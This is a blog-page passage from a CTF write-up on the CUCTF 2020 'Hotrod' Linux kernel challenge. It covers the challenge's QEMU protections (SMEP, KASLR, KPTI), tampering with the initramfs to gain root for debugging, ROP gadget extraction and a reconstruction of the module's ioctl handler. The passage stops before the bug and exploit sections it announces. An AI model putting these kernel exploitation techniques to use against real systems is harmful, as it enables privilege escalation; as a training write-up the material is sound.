@@ -1,0 +1,1828 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>[CUCTF 2020] Kernel Exploitation: Hotrod</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Hotrod is a kernel exploitation challenge created by my friend FizzBuzz101 for CUCTF 2020. I tested the challenge before release and since the exploitation process was really interesting, I decided to write this article. In the next sections we will see how to get a root shell exploiting a UAF, using a single allocation, a timerfd_ctx structure and userfaultfd." />
+    <meta name="keywords" content="kernel exploitation, timerfd_ctx, userfaultfd, uaf, race condition, CUCTF, kmalloc-256">
+    <link rel="shortcut icon" href="https://syst3mfailure.io/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://syst3mfailure.io/hotrod" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Syst3m Failure" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="[CUCTF 2020] Kernel Exploitation: Hotrod" />
+    <meta property="og:description" content="Hotrod is a kernel exploitation challenge created by my friend FizzBuzz101 for CUCTF 2020. I tested the challenge before release and since the exploitation process was really interesting, I decided to write this article. In the next sections we will see how to get a root shell exploiting a UAF, using a single allocation, a timerfd_ctx structure and userfaultfd." />
+    <meta property="og:url" content="https://syst3mfailure.io/hotrod" />
+    <meta property="og:image" content="https://syst3mfailure.io/assets/images/hotrod/title.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-10-19T09:00:00+02:00" />
+    <meta property="article:modified_time" content="2020-10-19T09:00:00+02:00" />
+    <meta property="article:tag" content="Ctf" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="[CUCTF 2020] Kernel Exploitation: Hotrod" />
+    <meta name="twitter:description" content="Hotrod is a kernel exploitation challenge created by my friend FizzBuzz101 for CUCTF 2020. I tested the challenge before release and since the exploitation process was really interesting, I decided to write this article. In the next sections we will see how to get a root shell exploiting a UAF, using a single allocation, a timerfd_ctx structure and userfaultfd." />
+    <meta name="twitter:url" content="https://syst3mfailure.io/" />
+    <meta name="twitter:image" content="https://syst3mfailure.io/assets/images/hotrod/title.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Syst3m Failure" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Ctf" />
+    <meta name="twitter:site" content="@" />
+    <meta name="twitter:creator" content="@" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Syst3m Failure",
+        "logo": "https://syst3mfailure.io/assets/images/sflogo.png"
+    },
+    "url": "https://syst3mfailure.io/hotrod",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://syst3mfailure.io/assets/images/hotrod/title.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://syst3mfailure.io/hotrod"
+    },
+    "description": "Hotrod is a kernel exploitation challenge created by my friend FizzBuzz101 for CUCTF 2020. I tested the challenge before release and since the exploitation process was really interesting, I decided to write this article. In the next sections we will see how to get a root shell exploiting a UAF,"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="[CUCTF 2020] Kernel Exploitation: Hotrod" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="https://syst3mfailure.io/"><img src="/assets/images/sflogo.png" alt="Syst3m Failure" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/research/">Research</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/various/">Various</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full post tag-Research ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="19 October 2020">19 October 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/research/'>RESEARCH</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">[CUCTF 2020] Kernel Exploitation: Hotrod</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/hotrod/title.png)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p>Hotrod is a kernel exploitation challenge created by my friend <a href="https://www.willsroot.io/">FizzBuzz101</a> for CUCTF 2020. I tested the challenge before release and since the exploitation process was really interesting, I decided to write this article. In the next sections we will see how to get a root shell exploiting a UAF, using a single allocation, a timerfd_ctx structure and userfaultfd. Let’s start!</p>
+
+<h3 id="information-gathering">Information Gathering</h3>
+<p>Before touching the kernel module, we need to better understand the system itself, gathering as much information as possible.
+We can start our analysis inspecting <code class="highlighter-rouge">run_challnge.sh</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
+
+qemu-system-x86_64 <span class="se">\</span>
+    <span class="nt">-s</span> <span class="se">\</span>
+    <span class="nt">-m</span> 64M <span class="se">\</span>
+    <span class="nt">-nographic</span> <span class="se">\</span>
+    <span class="nt">-kernel</span> <span class="s2">"./bzImage"</span> <span class="se">\</span>
+    <span class="nt">-append</span> <span class="s2">"console=ttyS0 quiet loglevel=3 oops=panic panic=-1 pti=on kaslr nosmap min_addr=4096"</span> <span class="se">\</span>
+    <span class="nt">-no-reboot</span> <span class="se">\</span>
+    <span class="nt">-cpu</span> qemu64,+smep <span class="se">\</span>
+    <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
+    <span class="nt">-initrd</span> <span class="s2">"./initramfs.cpio"</span> <span class="se">\</span>
+    <span class="nt">-smp</span> 2 <span class="se">\</span>
+    <span class="nt">-smp</span> <span class="nv">cores</span><span class="o">=</span>2 <span class="se">\</span>
+    <span class="nt">-smp</span> <span class="nv">threads</span><span class="o">=</span>1</code></pre></figure>
+
+<p>We can immediately see that various protections are enabled.</p>
+
+<p>– <strong>SMEP</strong> (Supervisor Mode Execution Prevention):</p>
+
+<p>With SMEP, the CPU will generate a fault if we try to directly execute instructions in user space. This means that even if we are able to control the kernel instruction pointer, we <strong>can’t</strong> simply map an executable memory region in user space, place our code there and execute it.</p>
+
+<p>Luckily, since <strong>SMAP</strong> (Supervisor Mode Access Prevention) is disabled, we can still access data in higher CPU rings, so we can build our ROP-chain in user space, perform stack pivoting and start executing gadgets.
+  Another approach is to turn off the 20th flag of the CR4 register to disable SMEP and then directly execute code in user space:</p>
+
+<p><img src="/assets/images/hotrod/cr4.png" alt="cr4" class="img-responsive" /></p>
+
+<p>– <strong>KASLR</strong> (Kernel Address Space Layout Randomization):</p>
+
+<p>With this option, every time the system boots up, the location of kernel code in memory is randomized.
+  This means that if we want to build a ROP-chain, we will probably need to leak pointers to compute the current kernel base address.</p>
+
+<p>– <strong>KPTI</strong> (Kernel Page Table Isolation):</p>
+
+<p>KPTI has been implemented in the Linux kernel after the <a href="https://meltdownattack.com/">Meltdown</a> security vulnerability.
+  It helps preventing information leaks separating user space and kernel space page tables.
+  Changing the 12th flag of the CR3 register, the system can switch between two sets of page tables.
+  When the system runs in kernel mode, it uses the first set, so it can access both kernel and user address space (The latter for things like <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/uaccess.h#L149">copy_to_user</a>). In addition, the NX flag is set in the top level of the user portion of kernel page tables, in this way any missed kernel to user CR3 switch will cause a crash. Instead, when the system runs in user mode, it uses the second set, now it can access to a copy of user address space, but just a limited portion of kernel address space: the data needed to enter/exit the kernel and the <a href="https://en.wikipedia.org/wiki/Interrupt_descriptor_table">IDT</a>.
+  These data are stored in the <a href="https://elixir.bootlin.com/linux/v5.8.3/source/arch/x86/include/asm/cpu_entry_area.h#L78">cpu_entry_area</a> structure, placed in the <a href="https://0xax.gitbooks.io/linux-insides/content/MM/linux-mm-2.html">fixmap</a>.</p>
+
+<p><img src="/assets/images/hotrod/cr3.png" alt="cr3" class="img-responsive" /></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">uname <span class="nt">-a</span>
+Linux <span class="o">(</span>none<span class="o">)</span> 5.8.3 <span class="c">#12 Sun August 26 12:00:00 UTC 2020 x86_64 GNU/Linux</span></code></pre></figure>
+
+<p>The kernel version is very recent, I couldn’t find any known vulnerability to perform privilege escalation.</p>
+
+<p>We can proceed extracting symbol addresses and ROP gadgets.
+Since the <a href="https://en.wikipedia.org/wiki/System.map">System.map</a> file is not present and we can’t access <code class="highlighter-rouge">/proc/kallsyms</code> as unprivileged user,
+we need to extract the filesystem and modify the <code class="highlighter-rouge">init</code> file to get root privileges.</p>
+
+<p>The filesystem is compressed using the <a href="https://en.wikipedia.org/wiki/Cpio">cpio</a> format, we can extract it and replace the user uid/gid using the following commands:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mkdir fs <span class="o">&amp;&amp;</span> <span class="nb">cd </span>fs <span class="o">&amp;&amp;</span> cpio <span class="nt">-idv</span> &lt; ../initramfs.cpio <span class="c"># Extract the archive</span>
+sed <span class="nt">-i</span> <span class="s1">'s/setuidgid 1000 sh/setuidgid 0 sh/g'</span> init <span class="c"># Replace the user uid/gid</span>
+find <span class="nb">.</span> | cpio <span class="nt">--create</span> <span class="nt">--format</span><span class="o">=</span><span class="s1">'newc'</span>  <span class="o">&gt;</span> ../initramfs.cpio <span class="c"># Rebuild the archive:</span></code></pre></figure>
+
+<p>The next step is to disable KASLR, since we need default symbol addresses, without randomization:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sed <span class="nt">-i</span> <span class="s1">'s/kaslr/nokaslr/g'</span> run_challenge.sh</code></pre></figure>
+
+<p>Finally we can get symbols from <code class="highlighter-rouge">/proc/kallsyms</code>.</p>
+
+<p>I also created <code class="highlighter-rouge">/bin/info</code>, containing:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
+
+<span class="nv">HOTROD</span><span class="o">=</span><span class="k">$(</span><span class="nb">cat</span> /proc/kallsyms | <span class="nb">grep </span>hotrod_ioctl | cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f1</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Module base: 0x<span class="nv">$HOTROD</span></code></pre></figure>
+
+<p>Then I added <code class="highlighter-rouge">/bin/sh /bin/info</code> in the <code class="highlighter-rouge">init</code> file, so I can get the hotrod_ioctl address every time the system boots up. Very useful for debugging purposes.</p>
+
+<p>Now we can re-enable KASLR, restore the user uid/gid to 1000 and rebuild the cpio archive.</p>
+
+<p>To obtain ROP gadgets, we need to extract the kernel image. We can do it using <code class="highlighter-rouge">binwalk</code> to locate
+the vmlinuz file (the compressed kernel image) inside bzImage:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">binwalk bzImage
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+15109         0x3B05          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00<span class="o">)</span></code></pre></figure>
+
+<p>Then we can use <code class="highlighter-rouge">dd</code> to extract it and <code class="highlighter-rouge">gunzip</code> to decompress the archive:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">dd <span class="k">if</span><span class="o">=</span>./bzImage <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>15109 <span class="nv">of</span><span class="o">=</span>vmlinux.gz <span class="o">&amp;&amp;</span> gunzip vmlinux.gz</code></pre></figure>
+
+<p>Now we can finally extract ROP gadgets using a tool like <a href="https://github.com/sashs/ropper">ropper</a> or <a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ropper <span class="nt">--file</span> ./vmlinux <span class="nt">--nocolor</span> <span class="o">&gt;</span> gadgets</code></pre></figure>
+
+<p>PS: We could also have used the <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> script to extract the kernel image.</p>
+
+<h3 id="reverse-engineering">Reverse Engineering</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">file hotrod.ko
+hotrod.ko: ELF 64-bit LSB relocatable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, BuildID[sha1]<span class="o">=</span>6bcf4da490ac3e3ab5db8148eb08238250716d32, with debug_info, not stripped</code></pre></figure>
+
+<p>As we can see, we have a 64-bit kernel module, with debug information and it is not stripped.</p>
+
+<p>I won’t cover the reverse engineering process (from asm to pseudo C) in detail  to avoid unnecessarily lengthening of the article.
+Here’s my high-level representation of the module after static analysis:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define ALLOC 0xBAADC0DE
+#define FREE  0xC001C0DE
+#define SHOW  0x1337C0DE
+#define EDIT  0xDEADC0DE
+</span>
+<span class="k">static</span> <span class="n">DEFINE_MUTEX</span><span class="p">(</span><span class="n">hotrod_lock</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">allocated</span><span class="p">,</span> <span class="n">freed</span><span class="p">,</span> <span class="n">showed</span><span class="p">,</span> <span class="n">edited</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">hotrod_dev</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">file_operations</span> <span class="n">hotrod_fops</span><span class="p">;</span>
+
+<span class="n">hotrod_fops</span><span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">hotrod_ioctl</span><span class="p">;</span>
+
+<span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">req</span><span class="p">;</span>
+
+
+<span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">hotrod</span><span class="p">;</span>
+
+
+<span class="kt">int</span> <span class="nf">init_hotrod</span><span class="p">()</span>
+<span class="p">{</span>
+
+  <span class="n">mutex_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hotrod_lock</span><span class="p">);</span>
+
+  <span class="n">hotrod_dev</span><span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="c1">// MISC_DYNAMIC_MINOR
+</span>  <span class="n">hotrod_dev</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">"hotrod"</span><span class="p">;</span>
+  <span class="n">hotrod_dev</span><span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">hotrod_fops</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hotrod_dev</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span><span class="p">,</span> <span class="s">"Hotrod Driver Initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span><span class="p">,</span> <span class="s">"Remember, all of the features only work once!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">hotrod_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">action</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_req</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">action</span><span class="p">)</span>
+    <span class="p">{</span>
+
+
+        <span class="k">case</span> <span class="n">ALLOC</span><span class="p">:</span>
+        <span class="p">{</span>
+
+            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">allocation_size</span> <span class="o">=</span> <span class="n">user_req</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">allocated</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">allocation_size</span> <span class="o">=</span> <span class="n">user_req</span><span class="p">;</span>
+                <span class="n">allocated</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+                <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="o">&amp;&amp;</span> <span class="mh">0xe0</span> <span class="o">&lt;=</span> <span class="n">allocation_size</span>  <span class="o">&lt;=</span> <span class="mh">0xf0</span> <span class="p">)</span>
+
+                    <span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">allocation_size</span><span class="p">,</span> <span class="mh">0xcc0</span><span class="p">);</span>
+
+                    <span class="k">if</span> <span class="p">(</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">allocation_size</span><span class="p">;</span>
+                        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="p">}</span>
+            <span class="p">}</span>
+
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+       <span class="p">}</span>
+
+
+       <span class="k">case</span> <span class="n">FREE</span><span class="p">:</span>
+       <span class="p">{</span>
+           <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">freed</span> <span class="p">)</span>
+           <span class="p">{</span>
+               <span class="n">freed</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+               <span class="k">if</span> <span class="p">(</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="o">&amp;&amp;</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="p">)</span>
+               <span class="p">{</span>
+                   <span class="n">kfree</span><span class="p">(</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span><span class="p">);</span>
+                   <span class="n">hotrod</span><span class="p">.</span><span class="n">contet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                   <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+               <span class="p">}</span>
+           <span class="p">}</span>
+
+           <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+       <span class="p">}</span>
+
+
+       <span class="k">case</span> <span class="n">SHOW</span><span class="p">:</span>
+       <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">showed</span> <span class="o">&amp;&amp;</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">showed</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+              <span class="k">if</span> <span class="p">(</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="n">user_req</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+
+                <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">copy_to_user</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="p">}</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+       <span class="p">}</span>
+
+
+       <span class="k">case</span> <span class="n">EDIT</span><span class="p">:</span>
+       <span class="p">{</span>
+
+         <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">edited</span> <span class="o">&amp;&amp;</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+         <span class="p">{</span>
+           <span class="n">edited</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+           <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="p">)</span>
+           <span class="p">{</span>
+             <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="n">user_req</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+
+             <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+             <span class="p">{</span>
+                 <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+                 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+             <span class="p">}</span>
+           <span class="p">}</span>
+         <span class="p">}</span>
+
+         <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+
+
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">exit_hotrod</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hotrod_dev</span><span class="p">);</span>
+  <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span><span class="p">,</span> <span class="s">"Hotrod Driver Removed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>As we can see, the <code class="highlighter-rouge">init_hotrod()</code> function is using <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-misc-register.html">misc_register()</a>, an interface offered by the <a href="https://www.linuxjournal.com/article/2920">misc driver</a> to allow modules to register a misc device with the kernel.</p>
+
+<p>In Linux, every device is identified by a <strong>major</strong> and a <strong>minor</strong> number.
+The major number is used by the kernel to identify the driver associated with the device. The misc driver is identified by the major number 10. The minor number depends on the device and it’s used by the driver to differentiate among various devices.</p>
+
+<p><code class="highlighter-rouge">misc_register()</code> takes as argument a <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/miscdevice.h#L79">miscdevice structure</a>, in this case <code class="highlighter-rouge">hotrod_dev</code>.</p>
+
+<p>We can see that in <code class="highlighter-rouge">hotrod_dev</code>, three fields are set:</p>
+
+<ul>
+  <li>
+    <p><strong>minor</strong>: In this case set to 255, corresponds to <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/miscdevice.h#L74">MISC_DYNAMIC_MINOR</a> and as we can see from <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-misc-register.html">kernel.org</a>: <code class="highlighter-rouge">If the minor number is set to MISC_DYNAMIC_MINOR a minor number is assigned and placed in the minor field of the structure</code>.</p>
+  </li>
+  <li>
+    <p><strong>name</strong>: It leaves no room for imagination…</p>
+  </li>
+  <li>
+    <p><strong>fops</strong>: It is a pointer to the <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/fs.h#L1837">file_operations structure</a>. With this structure, we can expose functions that will allow users interact with the device. In this case <code class="highlighter-rouge">unlocked_ioctl()</code> is the only exposed function, which we will cover shortly.</p>
+  </li>
+</ul>
+
+<p>After initialization, the device node is created in <code class="highlighter-rouge">/dev</code>. Now Hotrod appears like a character device on which is possible to perform I/O operation using a streams of characters:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-la</span> /dev | <span class="nb">grep </span>hotrod
+crw-rw-rw-    1 root     root       10,  63 Oct  19 09:11 hotrod</code></pre></figure>
+
+<p>As we can see, the letter “c” indicates that Hotrod a character device, its major number is 10 and the minor number is 63.</p>
+
+<p>At this point we know that we can interact with the module using <code class="highlighter-rouge">ioctl()</code>. The <code class="highlighter-rouge">hotrod_ioctl()</code> function, allows us to perform four different actions: <strong>Alloc</strong>, <strong>Free</strong>, <strong>Show</strong> and <strong>Edit</strong>.
+It’s important to note that <strong>we can perform each action only once</strong>!</p>
+
+<p>We have a <strong>limited allocation size between 0xe0 and 0xf0 bytes</strong>, to understand what it means, let’s briefly introduce the <a href="https://www.kernel.org/doc/gorman/html/understand/understand011.html">Slab Allocator</a>. The Slab allocator is used by the Linux kernel to group objects of the same size into <strong>caches</strong>. Each cache consist in one or more <strong>slabs</strong> and each slab is composed by one or more <strong>contiguous page frames</strong>. In each slab are stored a certain number of objects.</p>
+
+<p>There are two classes of caches:</p>
+
+<ul>
+  <li>
+    <p><strong>General purpose caches</strong>: They are called <code class="highlighter-rouge">kmalloc-N</code> where N is a power of two: <code class="highlighter-rouge">kmalloc-64</code>, <code class="highlighter-rouge">kmalloc-128</code>, <code class="highlighter-rouge">kmalloc-256</code> and so on.</p>
+  </li>
+  <li>
+    <p><strong>Specialized caches</strong>: Used for common objects: <code class="highlighter-rouge">task_struct</code>, <code class="highlighter-rouge">mm_struct</code>, <code class="highlighter-rouge">vm_area_struct</code> and so on.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/hotrod/slab.png" alt="slab" /></p>
+
+<p>The Slab allocator uses a <strong>LIFO</strong> scheme to perform allocations and deallocations. The kernel will keep track of freed objects in a <strong>freelist</strong> and will serve them when a new allocation of the same size takes place.</p>
+
+<p>(Of course this is just a basic overwiew of the Slab allocator, for a detailed analysis, check the articles in the <strong>References</strong> section).</p>
+
+<p>So <strong>for every allocation in range 0xe0-0xf0 bytes, 224-240 in decimal, the Slab allocator will use kmalloc-256 cache</strong>.</p>
+
+<p>Continuing to analyze the code, we can see the presence of <strong>checks that prevent us to overflow in the next object</strong> and <strong>other checks that prevent us to get a trivial UAF, Double Free</strong> and so on.</p>
+
+<p>So, where is the bug?</p>
+
+<p><img src="/assets/images/hotrod/whereis.gif" alt="cr3" class="img-responsive" /></p>
+
+<h3 id="the-bug">The Bug</h3>
+
